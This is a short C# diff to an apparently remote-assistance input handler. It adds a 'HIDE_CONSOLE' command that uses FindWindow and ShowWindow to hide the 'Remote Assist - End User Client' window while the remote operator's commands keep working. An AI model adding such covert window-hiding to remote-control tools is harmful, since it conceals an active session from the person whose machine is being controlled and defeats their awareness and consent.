@@ -19,6 +19,14 @@ namespace RemoteAssistInput
         [DllImport("user32.dll")]
         static extern int GetSystemMetrics(int nIndex);
 
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+
         const int SM_CXSCREEN = 0;
         const int SM_CYSCREEN = 1;
 
@@ -58,6 +66,14 @@ namespace RemoteAssistInput
 
                     switch (cmd)
                     {
+                        case "HIDE_CONSOLE":
+                            IntPtr hwnd = FindWindow(null, "Remote Assist - End User Client");
+                            if (hwnd != IntPtr.Zero)
+                            {
+                                ShowWindow(hwnd, SW_HIDE);
+                            }
+                            break;
+
                         case "MOVE":
                             if (parts.Length >= 3)
                             {
